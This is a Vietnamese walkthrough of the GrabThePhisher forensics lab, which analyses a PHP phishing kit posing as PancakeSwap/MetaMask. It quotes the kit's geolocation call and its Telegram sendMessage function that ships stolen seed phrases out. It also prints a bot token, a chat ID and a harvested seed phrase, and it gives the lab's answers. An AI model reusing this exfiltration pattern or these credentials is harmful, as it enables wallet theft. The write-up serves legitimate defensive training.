# GrabThePhisher Lab
## 1. Bối cảnh 

Bài Lab mô phỏng một sự cố tại một nền tảng tài chính phi tập trung (DeFi). Nền tảng nhận được nhiều khiếu nại của người dùng về việc rút tiền trái phép. Cuộc điều tra pháp y phát hiện một trang phishing giả mạo sàn giao dịch PancakeSwap, dụ nạn nhân nhập cụm từ khôi phục (seed phrase) của ví. Bộ phishing kit được đặt trên một máy chủ đã bị chiếm quyền và gửi thông tin đăng nhập ra ngoài thông qua một Telegram bot.

Nhiệm vụ của mình là đóng vai chuyên viên threat intelligence: phân tích hạ tầng phishing, xác định các chỉ số xâm phạm (IoCs), lần theo dấu vết trực tuyến của kẻ tấn công, gồm các bí danh và mã định danh Telegram, từ đó hiểu chiến thuật, kỹ thuật và quy trình (TTPs) của chúng. Công cụ sử dụng trong bài: Text Editor.


## 2. Điều tra

### Q1: Which wallet is used for asking the seed phrase?

- Sau khi rà soát cấu trúc thư mục gốc `pankewk` của bộ phishing kit mình phát hiện được chỉ tồn tại duy nhất thư mục con dành cho ví `metamask` (`pankewk/metamask/`), chứa trang giao diện giả `index.html` và tệp xử lý phía máy chủ `metamask.php`.

<img width="907" height="222" alt="image" src="https://github.com/user-attachments/assets/a059d439-15bf-41de-a8be-638187810381" />

### Q2: What is the file name that has the code for the phishing kit

- Cũng từ kết quả câu 1 mình biết được tệp mã nguồn xử lý phía máy chủ là `metamask.php`.

### Q3: In which language was the kit written?

- Ngôn ngữ lập trình được sử dụng để viết bộ phishing kit này là PHP

### Q4: What service does the kit use to retrieve the victim's machine information?

- Ở tệp mã nguồn `metamask.php` mình phát hiện được câu lệnh `file_get_contents("http://api.sypexgeo.net/json/".$_SERVER['REMOTE_ADDR'])` gửi địa chỉ IP của nạn nhân tới API của `Sypex Geo` để trích xuất thông tin quốc gia (`country->name_en`) và thành phố (`city->name_en`).

- <img width="872" height="170" alt="image" src="https://github.com/user-attachments/assets/39bd237c-aa87-4aa3-9a24-89a8d5a1d893" />

### Q5: How many seed phrases were already collected?

- Kiểm tra hàm `sendTel()` trong tệp `metamask.php`, mình xác định đường dẫn lưu trữ nhật ký cục bộ của bộ phishing kit tại `/log/log.txt` thông qua hàm `file_put_contents(..., FILE_APPEND)`.

<img width="1356" height="401" alt="image" src="https://github.com/user-attachments/assets/7533aefe-a4af-4556-9ece-44051245047a" />


- Sau đó mình mở thư mục `pankewk/log/` và đọc nội dung tệp `log.txt`. Ghi nhận tệp nhật ký lưu trữ `3` dòng dữ liệu, tương ứng với 3 cụm từ khôi phục ví đã bị thu thập.

<img width="897" height="110" alt="image" src="https://github.com/user-attachments/assets/b879694e-cb75-4bee-844b-3264f70163ec" />

### Q6: Could you please provide the seed phrase associated with the most recent phishing incident?

- Tử kết quả của Q5 mình ghi nhận được chuỗi 12 từ khôi phục ví gần nhất là `father also recycle embody balance concert mechanic believe owner pair muffin hockey`.

### Q7: Which medium was used for credential dumping?

- Mình kiểm tra hàm xử lý gửi dữ liệu `sendTel($message)` của metamask.php. Ghi nhận mã độc gửi yêu cầu tới đường dẫn API `https://api.telegram.org/bot<token>/sendMessage` kèm `chat_id` (`5442785564`) để tự động chuyển toàn bộ cụm từ khôi phục ví thu thập được về tài khoản `Telegram` của kẻ tấn công.

<img width="1442" height="360" alt="image" src="https://github.com/user-attachments/assets/deefe93f-5912-4736-8277-db7065199162" />


### Q8: What is the token for accessing the channel?

- Token mình ghi nhận được trong metamask.php là `5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`

<img width="1436" height="295" alt="image" src="https://github.com/user-attachments/assets/201c5bf1-8840-464d-a866-5cc10e62bc4f" />

### Q9: What is the Chat ID for the phisher's channel?

- Cũng từ kết quả Q8 mình ghi nhận được ChatId là `5442785564`

### Q10: What are the allies of the phish kit developer?

- Cũng ở metamask.php mình ghi nhận được phần chú thích ở đầu tệp chia sẻ bộ công cụ được ký tên bởi tác giả với bí danh là `j1j1b1s@m3r0`.

<img width="566" height="250" alt="image" src="https://github.com/user-attachments/assets/0683c203-99d5-482f-b4a9-fbcfe88721d6" />
